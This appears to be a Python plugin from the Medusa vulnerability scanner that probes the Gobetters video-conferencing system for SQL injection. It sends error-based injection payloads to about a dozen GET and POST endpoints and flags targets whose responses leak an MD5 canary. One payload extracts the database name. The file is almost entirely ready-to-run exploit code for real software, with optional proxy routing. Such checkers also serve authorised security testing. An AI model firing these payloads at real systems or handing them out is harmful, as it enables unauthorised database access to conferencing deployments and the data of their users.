#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Gobetters视频会议系统SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0134733
author: Ascotbe
reference: Lucifer
description: Gobetters视频会议系统多处SQL注入漏洞。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payloads = [
    "/web/seeserver.php?machineid=1'AND (SELECT 6632 FROM(SELECT COUNT(*),CONCAT(0xc,(MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
    "/web/department/deptsave.php?deptid=1 AND (SELECT 3593 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&ac=del&level=0&parentid=0&dm=root",
    "/web/android/dept.php?lan=1&deptcode=1'AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
    "/web/c/index.php?deptcode=1'AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
    "/web/onelanding/onelanding.php?username=1&deptcode=1'AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
    "/web/systemconfig/guangbo.php?id=12 AND (SELECT 5848 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&action=del&page=",
    "/web/device/dept.php?deptcode=1'AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
    "/web/users/depttree.php?deptid=-7276 OR ROW(1355,6771)>(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(DATABASE() AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM (SELECT 8443 UNION SELECT 5201 UNION SELECT 3389 UNION SELECT 2860)a GROUP BY x)",
    ""]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp

    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    Medusas=[]
    try:
        #s = requests.session()
        for payload in payloads:
            payload_url = scheme + "://" + url + payload
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url, headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
                Medusa = "{} 存在Gobetters视频会议系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass
    try:
        #s = requests.session()
        post_data = {
            "from": "123",
            "deptid": "0",
            "deptname": "123",
            "userid": "1 AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",
            "level": "123",
            "username": "admin",
            "realname": "admin",
            "userpass": "admin",
            "sex": "1",
            "sex": "1",
            "email": "1@qq.com",
            "mobile": "123",
            "telephone": "123",
            "roleid": "0"
        }
        payload_url = scheme + "://" + url + "/web/users/usersave.php"
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url,data=post_data,  headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url,data=post_data,  headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在Gobetters视频会议系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            Medusas.append(str(Medusa))
    except Exception as e:
        pass
    try:
        #s = requests.session()
        post_data = {
            "deptid": "1",
            "deptcode": "1",
            "deptlogo": "1'AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
            "deptdesc": "1"
        }
        payload_url = scheme + "://" + url + "/web/department/departmentsave.php"
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url,data=post_data,  headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url,data=post_data,  headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在Gobetters视频会议系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            Medusas.append(str(Medusa))
    except Exception as e:
        pass
    try:
        #s = requests.session()
        post_data = {
            "deptid": "1",
            "deptcode": "1",
            "deptlogo": "1'AND (SELECT 8709 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
            "deptdesc": "1"
        }
        payload_url = scheme + "://" + url + "/web/monitor/monitormentsave.php"
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url,data=post_data,  headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url,data=post_data,  headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在Gobetters视频会议系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            Medusas.append(str(Medusa))
    except Exception as e:
        pass
    try:
        #s = requests.session()
        post_data = {
            "username": "1'AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1"
        }
        payload_url = scheme + "://" + url + "/web/users/result.php"
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url,data=post_data,  headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url,data=post_data,  headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在Gobetters视频会议系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas